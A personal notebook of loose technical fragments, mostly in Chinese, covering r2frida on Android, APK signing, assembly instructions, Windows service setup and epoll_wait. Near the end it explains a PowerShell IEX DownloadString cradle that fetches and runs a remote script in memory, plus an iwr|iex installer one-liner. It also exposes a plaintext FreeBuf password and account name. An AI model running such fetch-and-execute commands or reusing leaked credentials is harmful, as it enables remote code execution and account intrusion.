### word

###  r2frida
.art格式
frida script destroyed

When reading 4 bytes from address 8 on android9/10 when attaching to a 32bit process (com.android.chrome or zygote) the process dies.

I did a workaround in r2frida because there was a bunch of people complaining on that, so i'm filling the issue here to point them here. and use the r2frida workaround until frida is ready.
解决问题的办法
```
R2FRIDA_SAFE_IO=1 r2 frida://usb//pid 
R2FRIDA_SAFE_IO=1 r2 frida://usb//19050
或者
r2 -d frida://BH95003NJ7/com.tencent.mobileqq
```
对了，要使用r2frida的命令，得在命令的前面加上 \ 或 =!；


FreeBuf 密码：bR268px7DYGYbb6 账号：无情剑客Burning


### Android 程序安装存储

android程序安装后存储的目录介绍：

1、android应用安装涉及到如下几个目录

①system/app 这系统自带的应用程序，无法删除

②data/app 用户程序安装的目录，有删除权限。

③data/data 存放应用程序的数据

④Data/dalvik-cache 将apk中的dex文件安装到dalvik-cache目录下

2、安装过程介绍：

复制APK安装包到data/app目录下，解压并扫描安装包，把dex文件(Dalvik字节码)保存到dalvik-cache目录，并data/data目录下创建对应的应用数据目录。

3、卸载过程介绍：

卸载过程：删除安装过程中在上述三个目录下创建的文件及目录。

======================================

com.yuedu.poetry
 sudo chmod 777 /usr/share/applications/studio.desktop


 ### Android查找资源的流程

在Android系统中，每一个应用程序一般都会配置很多资源，用来适配不同密度、大小和方向的屏幕，以及适配不同的国家、地区和语言等等。这些资源是在应用程序运行时自动根据设备的当前配置信息进行适配的。这也就是说，给定一个相同的资源ID，在不同的设备配置之下，查找到的可能是不同的资源。
这个查找过程对应用程序来说，是完全透明的，这个过程主要是靠Android资源管理框架来完成的，而Android资源管理框架实际是由AssetManager和Resources两个类来实现的。其中，Resources类可以根据ID来查找资源，而AssetManager类根据文件名来查找资源。事实上，如果一个资源ID对应的是一个文件，那么Resources类是先根据ID来找到资源文件名称，然后再将该文件名称交给AssetManager类来打开对应的文件的。基本流程如下图：
android_resource_resolved_flow.png

通过上图我们可以看到Resources是通过resources.arsc把Resource的ID转化成资源文件的名称，然后交由AssetManager来加载的。
而Resources.arsc这个文件是存放在APK包中的，他是由AAPT工具在打包过程中生成的，他本身是一个资源的索引表，里面维护者资源ID、Name、Path或者Value的对应关系，AssetManager通过这个索引表，就可以通过资源的ID找到这个资源对应的文件或者数据


4、BLX:  带链接和状态切换的跳转。结合了BX与BL功能。

BLX 指令的格式为：

BLX 目标地址

 

BLX 指令从ARM 指令集跳转到指令中所指定的目标地址，并将处理器的工作状态有ARM 状态切换到Thumb 状态，该指令同时将PC 的当前内容保存到寄存器R14 中。因此，当子程序使用Thumb 指令集，而调用者使用ARM 指令集时，可以通过BLX 指令实现子程序的调用和处理器工作状态的切换。

keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore

jarsigner -verbose -keystore demo.keystore demo.apk demo.keystore


Android查看导出函数：
``` 
nm -D 7z.so
objdump -tT 7z.so 
```
ESP FF8696D0


OR是按位“或”操作，当且仅当百两操作数对应位都为“0”时度结果相应位为“0”，否则结果相应位为“1”。
例：知1101B OR 0100B = 1101B
AND是按位“与”操作道，当且仅当两操作数对应位都为“1”时结果的相应位为专“1”，否则结果相应位为“0”。
### 堆
对堆操作的是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能


### 汇编
CMP该指令与SUB指令一样执行减法的操作，但它并不保存运算结果，只是根据结果设置相关的条件标志位（SF、ZF、CF、OF）。CMP指令后往往跟着条件转移指令，实现根据比较的结果产生不同的程序分支的功能。
JAE是为高于等于/不低于的转移指令。
leave指令的作用：
在32位汇编下相当于:
mov esp,ebp;//将ebp指向（ebp内部应当保存一个地址，所谓指向即这个地址对应的空间）的值赋给esp
pop ebp 



gcc提供了编译选项可以为指定架构生成汇编代码，

比如 linux下 

-m32 生成32位机器的汇编代码；
-m64则生成64位机器汇编代码；

由于64位机器的寄存器比32位机器多很多，所以GCC编译器会尽量使用寄存器来传递参数，而不是32位机器下的压栈。
###  开启Hyper-V
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -ALL
###  安装服务
sc.exe create "SmartSign2" binpath="D:\vs2022\Project\WorkerService1\bin\Release\net6.0\WorkerService1.exe"  
sc.exe failure "SmartSign2" reset=0 actions=restart/60000/restart/60000/run/1000  
sc qfailure "SmartSign2"  
sc.exe start "SmartSign2"  
###  配置文件的路径
Application: WorkerService1.exe  
CoreCLR Version: 6.0.322.12309  
.NET Version: 6.0.3  
Description: The process was terminated due to an unhandled exception.  
Exception Info: System.IO.FileNotFoundException: Could not find file 'C:\WINDOWS\system32\PersonInfo.json'。否则会出错  
#### epoll_wait
事件驱动?
```cpp
void MovementSensorRdb::StartThread()
{
    MOVEMENT_HILOGI(MOVEMENT_MODULE_SERVICE, "enter");
    std::make_unique<std::thread>(&MovementSensorRdb::LoopingThreadEntry, this)->detach();
}

void MovementSensorRdb::LoopingThreadEntry()
{
    MOVEMENT_HILOGI(MOVEMENT_MODULE_SERVICE, "enter");
    int nevents = 0;
    size_t cbct = callbacks_.size();
    struct epoll_event events[cbct];

    while (true) {
        int timeout = -1;
			
        nevents = epoll_wait(epFd_, events, cbct, timeout);
        if (nevents == -1) {
            continue;
        }
        for (int n = 0; n < nevents; ++n) {
            if (events[n].data.ptr) {
                MovementSensorRdb *func = const_cast<MovementSensorRdb *>(this);
                (callbacks_.find(events[n].data.fd)->second)(func);
            }
        }
    }
}
```
**将timeout由0变成-1。避免了while死循环，降低了CPU的使用。**

epoll有两种工作模式：LT（水平触发）模式和ET（边缘触发）模式。  
**默认情况下，epoll采用 LT模式工作**，这时可以处理阻塞和非阻塞套接字，而上表中的 EPOLLET表示可以将一个事件改为 ET模式。ET模式的效率要比 LT模式高，它只支持非阻塞套接字。

##### ET模式与LT模式的区别在于

当一个新的事件到来时，ET模式下当然可以从 epoll_wait调用中获取到这个事件，可是如果这次没有把这个事件对应的套接字缓冲区处理完，在这个套接字没有新的事件再次到来时，在 ET模式下是无法再次从 epoll_wait调用中获取这个事件的；而 LT模式则相反，只要一个事件对应的套接字缓冲区还有数据，就总能从 epoll_wait中获取这个事件。因此，在 LT模式下开发基于 epoll的应用要简单一些，不太容易出错，而在 ET模式下事件发生时，如果没有彻底地将缓冲区数据处理完，则会导致缓冲区中的用户请求得不到响应。默认情况下，Nginx是通过 ET模式使用 epoll的。

##### epoll_wait
```c
int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);
```

等待事件的产生，类似于select()调用。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个 maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，**0会立即返回，-1将不确定，也有说法说是永久阻塞**）。该**函数返回需要处理的事件数目，如返回0表示已超时。如果返回–1，则表示出现错误**，需要检查 errno错误码判断错误类型。

第1个参数 epfd是 epoll的描述符。

第2个参数 events则是分配好的 epoll_event结构体数组，epoll将会把发生的事件复制到 events数组中（events不可以是空指针，内核只负责把数据复制到这个 events数组中，不会去帮助我们在用户态中分配内存。内核这种做法效率很高）。

第3个参数 maxevents表示本次可以返回的最大事件数目，通常 maxevents参数与预分配的events数组的大小是相等的。

第4个参数 timeout表示在没有检测到事件发生时最多等待的时间（单位为毫秒），如果 timeout为0，则表示 epoll_wait在 rdllist链表中为空，立刻返回，不会等待。
### powershell
```powershell

IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); 
```
 该命令将#{remote_script}**加载到内存**，并没有把该脚本下载到本地。
 
```shell
  powershell -Command "iwr -useb  https://raw.githubusercontent.com/dapr/cli/master/install/install.ps1 | iex"
```